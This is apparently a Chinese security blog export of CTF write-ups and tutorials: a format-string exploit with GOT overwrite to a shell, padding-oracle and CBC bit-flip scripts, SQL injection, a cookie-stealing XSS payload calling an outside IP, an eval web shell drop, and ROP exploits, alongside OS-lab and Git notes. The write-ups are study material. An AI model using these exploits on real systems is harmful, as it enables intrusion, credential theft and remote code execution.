PROC_ZOMBIE，表明此子进程处于退出状态，需要当前进程(即子进程的父进程)完成对子进程的最终回收工作，即首先把子进程控制块从两个进程队列proc_list和hash_list中删除，并释放子进程的内核堆栈和进程控制块。自此，子进程才彻底地结束了它的执行过程，它所占用的所有资源均已释放。exit当执行exit功能的时候，会调用系统调用SYS_exit，而该系统调用的功能主要是由do_exit函数实现。具体过程如下：1、先判断是否是用户进程，如果是，则开始回收此用户进程所占用的用户态虚拟内存空间;（具体的回收过程不作详细说明）2、设置当前进程的中hi性状态为PROC_ZOMBIE，然后设置当前进程的退出码为error_code。表明此时这个进程已经无法再被调度了，只能等待父进程来完成最后的回收工作（主要是回收该子进程的内核栈、进程控制块）3、如果当前父进程已经处于等待子进程的状态，即父进程的wait_state被置为WT_CHILD，则此时就可以唤醒父进程，让父进程来帮子进程完成最后的资源回收工作。4、如果当前进程还有子进程,则需要把这些子进程的父进程指针设置为内核线程init,且各个子进程指针需要插入到init的子进程链表中。如果某个子进程的执行状态是 PROC_ZOMBIE,则需要唤醒 init来完成对此子进程的最后回收工作。5、执行schedule()调度函数，选择新的进程执行。所以说该函数的功能简单的说就是，回收当前进程所占的大部分内存资源,并通知父进程完成最后的回收工作。关于系统调用ucore所有的系统调用 与用户态的函数库调用执行过程相比，系统调用执行过程的有四点主要的不同：不是通过“CALL”指令而是通过“INT”指令发起调用；不是通过“RET”指令，而是通过“IRET”指令完成调用返回；当到达内核态后，操作系统需要严格检查系统调用传递的参数，确保不破坏整个系统的安全性；执行系统调用可导致进程等待某事件发生，从而可引起进程切换；根据之前的分析，应用程序调用的 exit/fork/wait/getpid 等库函数最终都会调用 syscall 函数,只是调用的参数不同而已（分别是 SYS_exit / SYS_fork / SYS_wait / SYS_getid ）当调用系统函数时，一般执行INT T_SYSCALL指令后，CPU 根据操作系统建立的系统调用中断描述符，转入内核态，然后开始了操作系统系统调用的执行过程，在执行之前，会保留系统调用前的执行现场，然后保存当前进程的trapframe中，之后操作系统就可以开始完成具体的系统调用服务，完成服务后，调用IRET，CPU根据内核栈的情况恢复到用户态，并把EIP指向tf_eip的值。这样整个系统调用就执行完毕了。实验成功实验心得通过本次实验，我了解到了用户进程的创建过程，同时了解了系统调用框架的实现机制。知道了系统调用sys_fork/sys_exec/sys_exit/sys_wait的实现，一开始对系统进程的切换比较模糊，通过实验实践了解到了它的具体实现过程，可以说收货还是很多的。通过跟踪程序流了解了其中的调用顺序和实现机制，如果在试验中能够多一些图解感觉会比较容易理解一点。]]></content>
      <tags>
        <tag>操作系统实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 格式化字符串漏洞利用]]></title>
    <url>%2F2017%2F05%2F18%2FLinux%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[目的是接触一些常见的漏洞，增加自己的视野。格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。下面结合着自己的学习经历，把漏洞详细的讲解一下，附上大量的实例。 目的是接触一些常见的漏洞，增加自己的视野。格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。下面结合着自己的学习经历，把漏洞详细的讲解一下，附上大量的实例。0x01 漏洞简述0x1 简介0x2 产生条件0x02 内存读取0x1 printf 参数格式0x2 堆栈情况0x3 实例分析1计算参数偏移个数1 gdb调试2 利用pwntools计算2利用DynELF实现内存泄露0x03 内存写入0x01 漏洞简述0x1 简介格式化字符串漏洞是一种常见的漏洞，原理和利用方法也很简单，主要利用方式就是实现内存任意读和写。前提是其中的参数可控。如果要深入理解漏洞必须进行大量的实验。0x2 产生条件首先要有一个函数，比如read, 比如gets获取用户输入的数据储存到局部变量中，然后直接把该变量作为printf这类函数的第一个参数值，一般是循环执行0x02 内存读取这是泄露内存的过程0x1 printf 参数格式这部分来自icemakr的博客32位读‘%{}$x’.format(index) // 读4个字节‘%{}$p’.format(index) // 同上面‘${}$s’.format(index)写‘%{}$n’.format(index) // 解引用，写入四个字节‘%{}$hn’.format(index) // 解引用，写入两个字节‘%{}$hhn’.format(index) // 解引用，写入一个字节‘%{}$lln’.format(index) // 解引用，写入八个字节64位读‘%{}$x’.format(index, num) // 读4个字节‘%{}$lx’.format(index, num) // 读8个字节‘%{}$p’.format(index) // 读8个字节‘${}$s’.format(index)写‘%{}$n’.format(index) // 解引用，写入四个字节‘%{}$hn’.format(index) // 解引用，写入两个字节‘%{}$hhn’.format(index) // 解引用，写入一个字节‘%{}$lln’.format(index) // 解引用，写入八个字节%1$lx: RSI%2$lx: RDX%3$lx: RCX%4$lx: R8%5$lx: R9%6$lx: 栈上的第一个QWORD0x2 堆栈情况当printf(“%s%d%d%d”)后面没有参数时，会打印后面的堆栈值。如果有read等函数，内存值可控，就可以实现内存任意读、任意写。在64位环境下的格式化字符串利用又是另一回事，在这里稍微的提一下，以免其他同学在走错道 程序为64位，在64位下，函数前6个参数依次保存在rdi、rsi、rdx、rcx、r8和r9寄存器中（也就是说，若使用”x$”，当1&lt;=x&lt;=6时，指向的应该依次是上述这6个寄存器中保存的数值），而从第7个参数开始，依然会保存在栈中。故若使用”x$”，则从x=7开始，我们就可以指向栈中数据了。0x3 实例分析这里选用广东省红帽杯的pwn2来具体说明。 首先看一下IDA反汇编代码 while ( 1 ) { memset(&amp;v2, 0, 0x400u); read(0, &amp;v2, 0x400u); printf((const char )&amp;v2); fflush(stdout); }我们发现了read函数，printf函数标准的格式化字符串漏洞。1计算参数偏移个数这里有两种方式(1) gdb调试在printf之前设置断点，0x0804852E 单步进入sprintf函数中，查看堆栈值 我们发现了我们可控的内存距离sprintf之间的距离为7(2) 利用pwntools计算利用FmStr函数计算from pwn import # coding:utf-8 # io = process(‘./pwn2’)# io =remote(‘106.75.93.221’, 20003)elf = ELF(‘./pwn2’)def test(payload): io = process(‘./pwn2’) io.sendline(payload) info = io.recv() io.close return infoautofmt = FmtStr(test)print autofmt.offset2利用DynELF实现内存泄露在这里我先介绍一下DynELF泄露内存的原理，采用这篇博客里写的我们应该怎么才能根据已知的函数地址来得到目标函数地址,需要有一下条件 1.我们拥有从Linux发型以来所有版本的 libc 文件 2.我们已知至少两个函数函数在目标主机中的真实地址 那么我们是不是可以用第二个条件去推测目标主机的 libc 版本呢 ? 我们来进行进一步的分析 : 关于条件二 : 这里我们可以注意到 : printf 是可以被我们循环调用的 因此可以进行连续的内存泄露 我们可以将多个 got 表中的函数地址泄露出来 , 我们这样就可以的至少两个函数的地址 , 条件二满足 关于条件一 : 哈哈~对了 , 这么有诱惑力的事情一定已经有人做过了 , 这里给出一个网站 : http://libcdb.com/ , 大名鼎鼎 pwntools 中的 DynELF 就是根据这个原理运作的 两个条件都满足 , 根据这些函数之间的偏移去筛选出 libc 的版本 这样我们就相当于得到了目标服务器的 libc 文件 , 达到了同样的效果以上是原理，其实说白了就是要利用能够打印指定内存的函数#coding:utf-8from pwn import sh = process(‘./pwn2’)elf = ELF(‘./pwn2’)#计算偏移def test(payload): temp = process(‘./pwn2’) temp.sendline(payload) info = temp.recv() temp.close() return infoauto = FmtStr(test)print auto.offset#泄露内存 因为函数本来可以循环执行所以不用rop链闭合def leak(addr): payload = ‘A%9$s’#这里需要注意一下 为了精确泄露内存用字符定下位 payload += ‘AAA’ payload += p32(addr) sh.sendline(payload) sh.recvuntil(‘A’) content = sh.recvuntil(‘AAA’) # content = sh.recv(4) print content if(len(content) == 3): print ‘[] NULL’ return ‘\x00’ else: print ‘[] %#x —&gt; %s’ % (addr, (content[0:-3] or ‘’).encode(‘hex’)) print len(content) return content[0:-3]#——– leak systemd = DynELF(leak, elf=ELF(‘./pwn2’))system_addr = d.lookup(‘system’,‘libc’)#意思是在libc中寻找system地址log.info(‘system_addr:’ + hex(system_addr))0x03 内存写入首先分析一个简单点的程序#include &lt;stdio.h&gt; int main() { int flag=5 ; int p = &amp;flag; char a[100]; scanf(“%s”,a); printf(a); if(flag == 2000) { printf(“good\n” ); } return 0;}利用gdb调试一下，在printf处设断点。查看一下堆栈的状况 发现偏移为5 于是构造%010x%010x%010x%01970x%n 这里只是对于flag内存的修改，并没有达到任意修改的效果，任意修改需要计算偏移利用写好内存地址，利用%n直接修改。下面继续pwn2的讲解在pwntools中有现成的函数可以使用fmtstr_payload可以实现修改任意内存 fmtstr_payload(auto.offset, {printf_got: system_addr})(偏移，{原地址：目的地址})from pwn import sh = process(‘./pwn2’)elf = ELF(‘./pwn2’)def test(payload): temp = process(‘./pwn2’) temp.sendline(payload) info = temp.recv() temp.close() return infoauto = FmtStr(test)print auto.offsetdef leak(addr): payload = ‘A%9$s’ payload += ‘AAA’ payload += p32(addr) sh.sendline(payload) sh.recvuntil(‘A’) content = sh.recvuntil(‘AAA’) # content = sh.recv(4) print content if(len(content) == 3): print ‘[] NULL’ return ‘\x00’ else: print ‘[*] %#x —&gt; %s’ % (addr, (content[0:-3] or ‘’).encode(‘hex’)) print len(content) return content[0:-3]#——– leak systemd = DynELF(leak, elf=ELF(‘./pwn2’))system_addr = d.lookup(‘system’,‘libc’)log.info(‘system_addr:’ + hex(system_addr))#——– change GOTprintf_got = elf.got[‘printf’]log.info(hex(printf_got))payload = fmtstr_payload(auto.offset, {printf_got: system_addr})sh.sendline(payload)payload = ‘/bin/sh\x00’sh.sendline(payload)sh.interactive()]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Padding Oracle Attack 分析]]></title>
    <url>%2F2017%2F05%2F12%2FPadding%20Oracle%20Attack%20%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Padding Oracle Attack是一个经典的攻击，在《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式,本篇文章结合着NJCTF的Be admin 进行详细的讲解，扫除知识上的盲点。 本篇文章讲解的顺序是攻击原理、攻击条件、本地测试、结果分析与总结四个方面进行详细的讲解。 Padding Oracle Attack是一个经典的攻击，在《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式,本篇文章结合着NJCTF的Be admin 进行详细的讲解，扫除知识上的盲点。 本篇文章讲解的顺序是攻击原理、攻击条件、本地测试、结果分析与总结四个方面进行详细的讲解。0x00攻击原理0x1 padding0x2 CBC分组密码的链接模式0x3 原理总结0x01 攻击条件0x02 本地测试0x1 在本地服务器测试代码0x2 攻击代码0x3 单个检验二值的代码0x4 使用CBC字节翻转0x5 任意值解密0x03 结果分析0x00攻击原理0x1 padding由于CBC是块密码工作模式, 所以要求明文长度必须是块长度的整数倍. 对于不满足的数据, 会进行数据填充到满足整数倍. 即 padding 01 02 02 03 03 03 04 04 04 04 05 05 05 05 05 06 06 06 06 06 06 07 07 07 07 07 07 0708 08 08 08 08 08 08 08即空N位就用N个\xN 进行补全 对于刚好满足明文, 则需要另补出一个块长度的数据0x2 CBC分组密码的链接模式由于此处的Padding Oracle Attack是针对CBC分组密码的链接模式来讲的因此此处再讲讲CBC CBC模式加密流程图 CBC模式解密流程图理解以上两张图以后还需要知道以下这张图中的intermediary Value的意思，意为中间值（其实就是解密操作后的值） 明文、密文、IV、恶意明文、恶意IV 关系 明文 = 解密(密文) XOR IV 特殊的明文 = 解密(密文) XOR 特殊IV0x3 原理总结1. 基于密码学算法的攻击，往往第一个要搞清楚的是，我们在攻击谁，或者准确的说我们的攻击点在哪里？在一个密码学算法中，有很多的参数(指攻击者可以控制的参数)，攻击者往往是针对其中某一个或某一些参数进行破解，穷举等攻击。在Padding Oracle Attack攻击中，攻击者输入的参数是IV+Cipher，我们要通过对IV的”穷举”来请求服务器端对我们指定的Cipher进行解密，并对返回的结果进行判断。2. 和SQL注入中的Blind Inject思想类似。我觉得Padding Oracle Attack也是利用了这个二值逻辑的推理原理，或者说这是一种”边信道攻击(Side channel attack)”。http://en.wikipedia.org/wiki/Side_channel_attack这种漏洞不能算是密码学算法本身的漏洞，但是当这种算法在实际生产环境中使用不当就会造成问题。和盲注一样，这种二值逻辑的推理关键是要找到一个”区分点”，即能被攻击者用来区分这个的输入是否达到了目的(在这里就是寻找正确的IV)。比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。0x01 攻击条件1.可以控制密文 或者 IV2.如果解密后不满足 padding 服务端会报错.一般我们在攻击时，可以控制IV或密文的其中之一（一般是控制IV），这样我们可以通过盲注的方法把中间值注出来。 第二个条件，如果padding的结果不对就会返回False，如果正确就会返回解密的值所以说攻击过程程就相当于盲注过程 下面会本地复现Be admin0x02 本地测试这里直接使用NJCTF的代码注意数据库的搭建！！！0x1 在本地服务器测试代码&lt;?phperror_reporting(0);define(“SECRET_KEY”, “1234567812345678”);define(“METHOD”, “aes-128-cbc”);session_start();function get_random_token(){ $random_token=‘’; for($i=0;$i&lt;16;$i++){ $random_token.=chr(rand(1,255)); } return $random_token;}function get_identity(){ global $defaultId; $defaultId=‘action’; $j = $defaultId; $token = get_random_token(); $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token ); $_SESSION[‘id’] = base64_encode($c); setcookie(“ID”, base64_encode($c)); setcookie(“token”, base64_encode($token)); if ($j === ‘admin’) { $_SESSION[‘isadmin’] = true; } else $_SESSION[‘isadmin’] = false;}function test_identity(){ if (!isset($_COOKIE[“token”])) return array(); if (isset($_SESSION[‘id’])) { $c = base64_decode($_SESSION[‘id’]); if ($username = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE[“token”]))) { if ($username === ‘admin’) { $_SESSION[‘isadmin’] = true; } else $_SESSION[‘isadmin’] = false; } else { die(“ERROR!”); } }}function login($encrypted_pass, $pass)//这里是攻击的地方{ $encrypted_pass = base64_decode($encrypted_pass); $iv = substr($encrypted_pass, 0, 16); $cipher = substr($encrypted_pass, 16); $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); echo var_dump($password); return $password == $pass;}#0000000000000000function need_login($message = NULL) { echo “ &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\”UTF-8\”&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=\”stylesheet\” href=\”CSS/target.css\”&gt; &lt;script src=\”https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\&quot;&gt;&lt;/script&amp;gt; &lt;/head&gt; &lt;body&gt;”; if (isset($message)) { echo “ &lt;div&gt;” . $message . “&lt;/div&gt;\n”; } echo “&lt;form method=\”POST\” action=’’&gt; &lt;div class=\”body\”&gt;&lt;/div&gt; &lt;div class=\”grad\”&gt;&lt;/div&gt; &lt;div class=\”header\”&gt; &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;br&gt; &lt;div class=\”login\”&gt; &lt;input type=\”text\” placeholder=\”username\” name=\”username\”&gt; &lt;input type=\”password\” placeholder=\”password\” name=\”password\”&gt; &lt;input type=\”submit\” value=\”Login\”&gt; &lt;/div&gt; &lt;script src=’http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&#39;&gt;&lt;/script&amp;gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;”;}global $flag;$flag = “flag{here_is_it}”;function show_homepage() { echo “&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;”; global $flag; printf(“Hello ~~~ ctfer! “); if ($_SESSION[“isadmin”]) echo $flag; echo “&lt;div&gt;&lt;a href=\”logout.php\”&gt;Log out&lt;/a&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;”;}if (isset($_POST[‘username’]) &amp;&amp; isset($_POST[‘password’])) { $username = (string)$_POST[‘username’]; $password = (string)$_POST[‘password’]; echo $username.$password; $conn=new mysqli(“localhost”,“root”,“”,“test”) or die(“有错误”.mysql_error()); $query = “SELECT username, encrypted_pass from users WHERE username=’$username’”; $res = $conn-&gt;query($query) or trigger_error($conn-&gt;error . “[$query]”); if($row = $res-&gt;fetch_assoc()) $encrypted_pass = $row[“encrypted_pass”]; // echo ‘P’.$encrypted_pass.’P’.var_dump($row) ; if ($row &amp;&amp; login($encrypted_pass, $password)) { echo “you are in!” . “&lt;/br&gt;”; get_identity(); show_homepage(); } else { echo “&lt;script&gt;alert(‘login failed!’);&lt;/script&gt;”; need_login(“Login Failed!”); }} else { test_identity(); if (isset($_SESSION[“id”])) { show_homepage(); } else { need_login(); }}0x2 攻击代码import requestsimport base64import time# url=’http://218.2.197.235:23737/‘url=‘http://127.0.0.1/2.php‘N=16phpsession=“”ID=“”def inject1(password): param={‘username’:“‘ union select ‘action’,’{password}”.format(password=password),‘password’:‘’} result=requests.post(url,data=param) #print result.content return resultdef inject_token(token): header={“Cookie”:“PHPSESSID=”+phpsession+“;token=”+token+“;ID=”+ID} result=requests.post(url,headers=header) return resultdef xor(a, b): return “”.join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])def pad(string,N): l=len(string) if l!=N: return string+chr(N-l)(N-l)def padding_oracle(N,cipher): get=“” for i in xrange(1,N+1): for j in xrange(0,256): padding=xor(get,chr(i)(i-1)) c=chr(0)(16-i)+chr(j)+padding+cipher print c.encode(‘hex’) result=inject1(base64.b64encode(chr(0)16+c)) if “ctfer” not in result.content: print result.content,c.encode(‘hex’) get=chr(j^i)+get time.sleep(0.1) break return getsession=inject1(“action”).headers[‘set-cookie’].split(‘,’)phpsession=session[0].split(“;”)[0][10:]print phpsessionID=session[1][4:].replace(“%3D”,‘=’).replace(“%2F”,‘/‘).replace(“%2B”,‘+’).decode(‘base64’)token=session[2][6:].replace(“%3D”,‘=’).replace(“%2F”,‘/‘).replace(“%2B”,‘+’).decode(‘base64’)middle=“”middle=padding_oracle(N,ID)print “ID:”+ID.encode(‘base64’)print “token:”+token.encode(‘base64’)print “middle:”+middle.encode(‘base64’)print “\n”if(len(middle)==16): plaintext=xor(middle,token); print plaintext.encode(‘base64’) des=pad(‘admin’,N) tmp=“” print des.encode(“base64”) for i in xrange(16): tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i])) print tmp.encode(‘base64’) result=inject_token(base64.b64encode(tmp)) print result.content if “flag” in result.content or “NJCTF” in result.content or ‘njctf’ in result.content: input(“success”)0x3 单个检验二值的代码import requestsimport base64import timeurl=‘http://127.0.0.1/2.php‘#’http://218.2.197.235:23737/‘def inject1(password): param={‘username’:“‘ union select ‘action’,’{password}”.format(password=password),‘password’:‘’} result=requests.post(url,data=param) #print result.content return resultID = ‘CCaTjI5AQCB8CX7kHzc8yw==’.decode(‘base64’)ss =(“000082da81097ea064692058165be8790826938c8e4040207c097ee41f373ccb”).decode(‘hex’)#000081da81097ea064692058165be8790826938c8e4040207c097ee41f373ccbresult=inject1(base64.b64encode(ss))print ssprint result.content0x4 使用CBC字节翻转function test_identity(){ if (!isset($_COOKIE[“token”])) return array(); if (isset($_SESSION[‘id’])) { $c = base64_decode($_SESSION[‘id’]); if ($username = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE[“token”]))) { echo $username; if ($username === ‘admin’) { $_SESSION[‘isadmin’] = true; } else $_SESSION[‘isadmin’] = false; } else { die(“ERROR!”); } }}上述代码可以利用cbc字节翻转直接将密文所对应的明文转化为admin 具体的脚本如下#nbdRWPAEcOUhoGkPhwRTCw==#actionfrom binascii import b2a_hex, a2b_hexfrom base64 import s = b64decode(‘nbdRWPAEcOUhoGkPhwRTCw==’)b = s[0]+chr(ord(‘c’)^ord(s[1])^ord(‘d’))+chr(ord(‘t’)^ord(s[2])^ord(‘m’))+s[3]+chr(ord(‘o’)^ord(s[4])^ord(‘n’))+chr(ord(‘n’)^ord(s[5])^ord(‘\x0b’))for i in range(6,16): b += chr(ord(‘\x0a’)^ord(s[i])^ord(‘\x0a’))print b64encode(b)将生成的base64编码放到cookie的token中解析之后就是admin 从而攻击成功 0x5 任意值解密2.php&lt;?phperror_reporting(0);define(“SECRET_KEY”, “1234567812345678”);define(“METHOD”, “aes-128-cbc”);$token = ‘1234567890123456’;$j = ‘flag{111111111}’;if ($_GET[‘a’]) { $e = hex2bin($_GET[‘a’]); $token = $_GET[‘token’]; if(openssl_decrypt($e, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token )) { echo “congratulation”,openssl_decrypt($e, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token ); } else { echo “decrypt failed”; }}else{echo openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token ); } ?&gt;构造任意解密值，主要还是根据中间值进行计算，集成化脚本如下# coding:utf-8import requestsfrom Crypto.Util.number import getPrime, long_to_bytes, bytes_to_longimport binasciis = requests.session()url = ‘http://127.0.0.1/2.php‘payload = ‘11’16 #try to calculate mid valuetoken = ‘00’16 #use 16 rounds calc token valuedic = ‘1234567890abcdef’box = []for i in dic: for j in dic: box.append(i+j)# print boxdef attack(token,pro,num,payload): global mid for i in box: data = { ‘a’:token[:-num2]+i+pro+payload, ‘token’:token } r = s.get(url,params=data) content = r.content print token[:-num2]+i+pro+payload if ‘congratulation’ in content: mid = chr(int(i,16)^ord(long_to_bytes(num)))+mid # print ord(mid) pro = ‘’.join([‘0’(2-len(hex(ord(long_to_bytes(num+1))^ord(mid[k]))[2:]))+hex(ord(long_to_bytes(num+1))^ord(mid[k]))[2:] for k in range(len(mid))]) # token = token[:-1] print content,num break return protext = ‘12345678901234567890’+‘\x0b’*12def final(token,payload,result): pro = ‘’ mid = ‘’ global mid for i in range(16): # print ord(pro) pro = attack(token,pro,i+1,payload) # print ord(pro) # token = token[:-1] ppp = ‘’.join([chr(ord(result[k])^ord(mid[k])) for k in range(len(mid))]) return binascii.b2a_hex(ppp)payload = final(token,payload,text[:16])#输入第一块值（最后的返回值），第二块值，以及要解密的值print payloadprint final(token,payload,text[16:])0x03 结果分析利用上述代码在解密的地方进行攻击 当padding值正确时会正常解密，这时就会返回false，所以登录失败出现上图结果。如果解密错误就会返回true，继续寻找正确的真值。知道全部找到为止。]]></content>
      <tags>
        <tag>WEB漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 SSCTF Writeup]]></title>
    <url>%2F2017%2F05%2F08%2F2017%20SSCTF%20Writeup%2F</url>
    <content type="text"><![CDATA[2017 SSCTF Writeup 这周两场比赛赶在了一起，ssctf没来的急打，现在补一下。WEB0x01 捡吗？本题是道内网访问的题目少不了的就是内网扫描 首先生成字典f = open(‘1.txt’,‘w’)for i in range(255): f.write(str(i)+‘\n’)利用burpsuit爆破 发现了网段中的可靠ip 190 后来等hint放出来 直接访问ftp这里用大写 弹幕一道xss的题目，在网页刚开始刷新的时会出现一个弹框 里面的内容是 &lt;img src=”/static/images/welcome.gif” onload=”c=encodeURIComponent(document.cookie);if(c.length&gt;32){a=new Image();a.src=’/xssHentai/request/1/?body=’+c;}”&gt;输入http://117.34.71.7/xssHentai/是个登录界面最简单的注入注进去 构造payload&lt;script&gt;var img =new Image();img.src = “http://45.78.29.252:8888/?a=&quot;+document.cookie;document.getElementsByTagName(&quot;head“)[0].appendChild(img);&lt;/script&gt;发现中间如果是4不行如果是1可以接收到flag]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB 杂记]]></title>
    <url>%2F2017%2F05%2F07%2FWEB%20%E6%9D%82%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[把早期的web题刷一刷，把其中一些比较好的给记录下来以便整理、学习 php_is_fun把早期的web题刷一刷，把其中一些比较好的给记录下来以便整理、学习1. php_is_fun第七季极客大挑战&lt;?phpif(isset($_GET) &amp;&amp; !empty($_GET)){ $url = $_GET[‘file’]; $path = “upload/“.$_GET[‘path’];}else{ show_source(FILE); exit();}if(strpos($path,‘..’) &gt; -1){ die(‘SYCwaf!’);}if(strpos($url,‘http://127.0.0.1/‘) === 0){ file_put_contents($path, file_get_contents($url)); echo “console.log($path update successed!)”;}else{ echo “Hello.Geeker”;}题目分析： 我们，整个题目的输入只有两个地方path和file我们要构造的payload也只能从这两个地方传入。两个参数的作用很简单这里就不说了。 我们的目的是将我的文件内容写入文件，发现了他会把path打印出来 因此我们想到利用二次传参，第一层将我们要写的内容打印出来，第二层将打印的内容写入文件 http://127.0.0.1/2.php?path=%3C?php%20@eval($_POST[1]);?%3E&amp;file=http://127.0.0.1/ http://127.0.0.1/2.php?path=jj.php&amp;file=http://127.0.0.1/2.php?path=%3C?php%20@eval($_POST[1]);?%3E&amp;file=http://127.0.0.1/注意二次编码 最后提交 http://127.0.0.1/2.php?path=aaz.php&amp;file=http://127.0.0.1/2.php?path=%253C%253Fphp%2520@eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%26file=http://127.0.0.1/ 然后访问aaz.php]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 Redhat广东省信息安全竞赛 Writeup]]></title>
    <url>%2F2017%2F05%2F07%2F2017%20Redhat%E5%B9%BF%E4%B8%9C%E7%9C%81%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Writeup%2F</url>
    <content type="text"><![CDATA[2017 Redhat广东省信息安全竞赛 Writeup WEB0x1 刮刮乐 通过文件扫描找到有文件泄露 利用Githack工具就可以把文件下下来 flag{027ea8c2-7be2-4cec-aca3-b6ba400759e8}0x2 PHPMyWIND这题是道综合性网站，可以查到现有的漏洞，一点都没有变 原题 根据报错注入，显示的md5找到对应的值就是密码访问其中的flag4ae482cda6e.txt即可得到flag0x3 后台题目提示了有弱口令 首先生成字典f = open(‘1.txt’,‘w’)for i in range(1,13): for j in range(1,32): f.write(‘2017’+‘0’(2-len(str(i)))+str(i)+‘0’(2-len(str(j)))+str(j)+‘\n’)利用burpsuit爆破0x4 thinkseeker扫一下有index.php~源代码 1、用with rollup过前面两个if 2、用盲注找到flag 关于第一点在实验吧有原题：http://www.shiyanbar.com/ctf/1940 过滤方法稍有不同，用操作符代替关键字即可。token使用变量覆盖就可以。 第二点就是infoid这个参数有盲注，跑脚本可以拿到flag。 最后贴上注入脚本import requestsstring = ‘’dic = “flag{}abcdef1234567890”for i in range(1,40): for j in dic: url=“http://106.75.117.4:3083/?token=21232f297a57a5a743894a0e4a801fc3&amp;infoid=1%0a%26%26%0aascii(substr((select%0agroup_concat(flag)%0afrom%0aflag)from({})for(1)))={}&amp;userid=1%0a||%0a1%0agroup%0aby%0apassword%0awith%0arollup%0alimit%0a1%0aoffset%0a1&amp;password=”.format(i,ord(j)) s=requests.get(url=url) content=s.content if “flag is in flag!” in content: string+=j break print stringPWNPWN1简单的栈溢出，通过构造rop执行system，直接写出脚本from pwn import pwn1 = ELF(‘redhat/pwn1’)sh = remote(‘106.75.93.221’, 10000)padding = ‘A’(52)#长度爆出来的system_addr = p32(pwn1.plt[‘system’])scanf_addr = p32(0x08048410)bss_addr = p32(0x0804A040)args = p32(0x08048629)+ bss_addrrop = p32(0x080485ee)sh.recvline()payload = padding+scanf_addr+rop+args+system_addr+‘a’4+bss_addrsh.sendline(payload)sh.sendline(‘/bin/sh\x00’)sh.interactive()还有一种较为简单的方法，直接利用pwntools自带的工具from pwn import #context.log_level = ‘debug’binary = ELF(‘./redhat/pwn1’)p = remote(‘106.75.93.221’, 10000)p.recvline()rop = ROP(binary)rop.call(0x08048410,(0x08048629, 0x0804A040))rop.system(0x0804A040)payload = str(rop)p.sendline(‘a’*52 + payload )p.sendline(‘/bin/sh’)p.interactive()]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git管理中的艺术]]></title>
    <url>%2F2017%2F05%2F07%2FGit%E7%AE%A1%E7%90%86%E4%B8%AD%E7%9A%84%E8%89%BA%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[在日常的生活中，或多或少的会接触到Git，这个开源代码系统给我们提供了很大的方便。下面我就Git简介、创建、使用三个方面来给大家讲解一下。自己会的东西也不多，也是一个学习记录的过程。 0x00 Git简介0x01 建立并配置Git0x0 检查SSH第一步第二步第三步0x1 拥有自己的Github账号0x2 建立仓库仓库名字可以不和Github上的一样0x3 配置本地信息0x02 Git使用0x0 Git命令简介0x1 图解Git分支0x2 命令详解DIffCommitReset在日常的生活中，或多或少的会接触到Git，这个开源代码系统给我们提供了很大的方便。下面我就Git简介、创建、使用三个方面来给大家讲解一下。自己会的东西也不多，也是一个学习记录的过程。0x00 Git简介Git 是一个快速、可扩展的分布式版本控制系统，它具有极为丰富的命令集，对内部系统提供了高级操作和完全访问.Git与你熟悉的大部分版本控制系统的差别是很大的。也许你熟悉Subversion、CVS、Perforce、Mercurial 等等，他们使用“增量文件系统” （Delta Storage systems）, 就是说它们存储每次提交(commit)之间的差异。Git正好与之相反，它会把你的每次提交的文件的全部内容（snapshot）都会记录下来。 理论上，Git 可以保存任何文档，但是最善于保存文本文档，因为它本来就是为解决软件源代码（也是一种文本文档）版本管理问题而开发的，提供了许多有助于文本分析的工具。对于非文本文档，Git 只是简单地为其进行备份并实施版本管理。0x01 建立并配置Git0x0 检查SSH因为GitHub会用到SSH，因此需要在shell里检查是否可以连接到GitHub： ssh -T git@github.com 如果看到：Warning: Permanently added ‘github.com,204.232.175.90’ (RSA) to the list of known hosts. Permission denied 